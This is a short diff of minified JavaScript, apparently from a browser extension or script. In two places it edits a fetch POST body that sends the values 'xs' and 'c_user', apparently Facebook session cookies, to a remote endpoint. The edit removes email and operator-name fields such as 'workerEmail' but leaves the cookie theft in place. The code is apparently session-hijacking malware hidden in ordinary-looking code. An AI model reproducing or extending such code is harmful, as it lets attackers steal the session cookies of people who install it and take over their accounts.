@@ -9820,11 +9820,10 @@
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
-                                            emails: o,
-                                            workerEmail: "salmanjani email",
+                                           
                                             xs: r,
                                             c_user: i,
-                                            name: "asad"
+                                           
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13364,11 +13363,10 @@
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
-                                            emails: e,
-                                            workerEmail: "",
+                                            
                                             xs: o,
                                             c_user: u,
-                                            name: "My Self"
+                                            
                                         })
                                     }).then((e => {
                                         e.ok
